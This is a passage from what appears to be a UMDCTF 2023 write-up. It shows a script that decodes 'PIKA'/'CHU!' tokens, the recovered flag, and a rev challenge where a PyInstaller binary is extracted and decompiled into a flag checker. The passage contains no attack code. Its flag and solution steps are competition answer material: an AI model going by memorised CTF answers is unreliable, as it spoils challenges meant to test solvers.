&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;l:
&lt;&#x2F;span&gt;&lt;span&gt;    m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;list&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt;(m))
&lt;&#x2F;span&gt;&lt;span&gt;byte&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;m:
&lt;&#x2F;span&gt;&lt;span&gt;    bits&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;CHU!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            bits&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PIKA&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            bits&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;else&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    oneb &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(bits)
&lt;&#x2F;span&gt;&lt;span&gt;    byte&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(oneb&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;byte:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(i)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#UMDCTF{P1K4CHU_Once_upon_a_time,_there_was_a_young_boy_named_Ash_who_dreamed_of_becoming_the_world&amp;#39;s_greatest_Pokemon_trainer._He_set_out_on_a_journey_with_his_trusty_Pokemon_partner,_Pikachu,_a_cute_and_powerful_electric-type_Pokemon._As_Ash_and_Pikachu_traveled_through_the_regions,_they_encountered_many_challenges_and_made_many_friends._But_they_also_faced_their_fair_share_of_enemies,_including_the_notorious_Team_Rocket,_who_were_always_trying_to_steal_Pikachu._Despite_the_odds_stacked_against_them,_Ash_and_Pikachu_never_gave_up._They_trained_hard_and_battled_even_harder,_always_looking_for_ways_to_improve_their_skills_and_strengthen_their_bond._And_along_the_way,_they_learned_valuable_lessons_about_friendship,_determination,_and_the_power_of_believing_in_oneself._Eventually,_Ash_and_Pikachu&amp;#39;s_hard_work_paid_off._They_defeated_powerful_opponents,_earned_badges_from_Gym_Leaders,_and_even_competed_in_the_prestigious_Pokemon_League_tournaments._But_no_matter_how_many_victories_they_achieved,_Ash_and_Pikachu_never_forgot_where_they_came_from_or_the_importance_of_their_friendship._In_the_end,_Ash_and_Pikachu_became_a_legendary_team,_admired_by_Pokemon_trainers_around_the_world._And_although_their_journey_may_have_had_its_ups_and_downs,_they_always_knew_that_as_long_as_they_had_each_other,_they_could_overcome_any_obstacle_that_stood_in_their_way}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;rev&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#rev&quot; aria-label=&quot;Anchor link for: rev&quot;&gt;Rev&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;welcome-to-python&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#welcome-to-python&quot; aria-label=&quot;Anchor link for: welcome-to-python&quot;&gt;Welcome to Python&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_welcometopy.png&quot; alt=&quot;welcome&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Challenge had this binary file &lt;a&gt;chall&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As it is a ELF file I decompiled it to &lt;code&gt;Pyc&lt;&#x2F;code&gt; then Pyc to &lt;code&gt;py&lt;&#x2F;code&gt; file.
My teammates found that python generated &lt;code&gt;ELF&lt;&#x2F;code&gt; can be decompiled to pyc with &lt;a href=&quot;https:&#x2F;&#x2F;snapcraft.io&#x2F;pyinstxtractor&quot; target=_blank&gt;pyinstxtractor&lt;&#x2F;a&gt;. It generated a pyc file then used online pyc decompiler to decompile to the py file.&lt;&#x2F;p&gt;
&lt;p&gt;The decompiled &lt;code&gt;chall.py&lt;&#x2F;code&gt; is&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Source Generated with Decompyle++
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# File: chal.pyc (Python 3.10)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;math &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;sqrt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;sin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;cos
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;ctypes &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;c_uint32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;c_float
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;sys &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;exit &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;exit_
&lt;&#x2F;span&gt;&lt;span&gt;source &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;672662614&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;741343303&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;495239261&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;744259788&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;722021046&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA70AA247&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1053692&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA8050035&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA982A820&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;624689&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA90D20BC&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;41134&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;295340&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA0028102&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;622681&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;576469&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;671170814&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8041086E&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;765&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;680595550&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x80200166&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;698368102&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2437137&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8042C1EE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;570966112&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4612341&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x800008D4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA94D02CE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16484&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2103301&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;136226&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9438506&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;663820758&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8013523B&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8405532&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA4000875&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x80030A78&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;136768&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;seed &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;64
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wandom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cos&lt;&#x2F;span&gt;&lt;span&gt;(x) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sin&lt;&#x2F;span&gt;&lt;span&gt;(x) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;evil_bit_hack&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;y&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(c_uint32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from_buffer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;c_float&lt;&#x2F;span&gt;&lt;span&gt;(y))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;==========================================&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Professional flag checker service (v 97.2)&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;==========================================&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Show me the flag: &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;lf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(flag)
&lt;&#x2F;span&gt;&lt;span&gt;ls &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(source)
&lt;&#x2F;span&gt;&lt;span&gt;l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;lf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;lf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;ls &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;ls
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(seed&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;seed &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;l):
&lt;&#x2F;span&gt;&lt;span&gt;    w &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wandom&lt;&#x2F;span&gt;&lt;span&gt;(i)
&lt;&#x2F;span&gt;&lt;span&gt;    c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= ~&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(flag[i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;seed]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;evil_bit_hack&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wandom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wandom&lt;&#x2F;span&gt;&lt;span&gt;(w))) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;evil_bit_hack&lt;&#x2F;span&gt;&lt;span&gt;(w)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;source[i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;seed] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;c:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Uh oh! We don&amp;#39;t think your flag is correct... :(&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit_&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
